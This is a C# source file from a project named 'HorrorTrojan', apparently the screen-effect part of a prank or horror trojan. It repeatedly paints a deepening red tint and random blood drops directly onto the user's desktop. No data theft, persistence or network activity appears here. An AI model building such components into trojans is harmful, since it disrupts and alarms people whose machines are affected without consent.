using System;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;

namespace HorrorTrojan
{
    public class GDIOverlay
    {
        private Thread renderThread;
        private bool isRunning = false;
        private Random rnd = new Random();
        private int elapsedSeconds = 0;
        private int dropCount = 0;
        private int screenWidth;
        private int screenHeight;
        private object lockObject = new object();
        private int redAlpha = 0;
        
        public GDIOverlay()
        {
            screenWidth = Screen.PrimaryScreen.Bounds.Width;
            screenHeight = Screen.PrimaryScreen.Bounds.Height;
        }
        
        public void Start()
        {
            if (isRunning) return;
            isRunning = true;
            renderThread = new Thread(RenderLoop);
            renderThread.IsBackground = true;
            renderThread.Start();
        }
        
        public void Stop()
        {
            isRunning = false;
            if (renderThread != null && renderThread.IsAlive)
                renderThread.Join(100);
        }
        
        public void UpdateDrops()
        {
            lock (lockObject)
            {
                elapsedSeconds++;
                dropCount = Math.Min(elapsedSeconds / 2, 60);
                redAlpha = Math.Min(50, elapsedSeconds / 3);
            }
        }
        
        private void RenderLoop()
        {
            while (isRunning)
            {
                try
                {
                    DrawOverlay();
                    Thread.Sleep(30);
                }
                catch { }
            }
        }
        
        private void DrawOverlay()
        {
            IntPtr desktopDC = NativeMethods.GetDC(IntPtr.Zero);
            if (desktopDC == IntPtr.Zero) return;
            
            try
            {
                using (Graphics g = Graphics.FromHdc(desktopDC))
                {
                    int count;
                    int alpha;
                    lock (lockObject)
                    {
                        count = dropCount;
                        alpha = redAlpha;
                    }
                    
                    using (SolidBrush bgBrush = new SolidBrush(Color.FromArgb(alpha, 40, 0, 0)))
                    {
                        g.FillRectangle(bgBrush, 0, 0, screenWidth, screenHeight);
                    }
                    
                    if (count >= 3)
                    {
                        for (int i = 0; i < count; i++)
                        {
                            int x = rnd.Next(0, screenWidth);
                            int y = rnd.Next(0, screenHeight);
                            int size = rnd.Next(2, 10);
                            int dropAlpha = rnd.Next(120, 220);
                            
                            using (SolidBrush brush = new SolidBrush(Color.FromArgb(dropAlpha, 180, 0, 0)))
                            {
                                if (rnd.Next(0, 2) == 0)
                                    g.FillEllipse(brush, x, y, size, size * 2);
                                else
                                    g.FillEllipse(brush, x, y, size, size);
                            }
                        }
                    }
                }
            }
            finally
            {
                NativeMethods.ReleaseDC(IntPtr.Zero, desktopDC);
            }
        }
        
        public void Dispose()
        {
            Stop();
            renderThread = null;
        }
    }
}
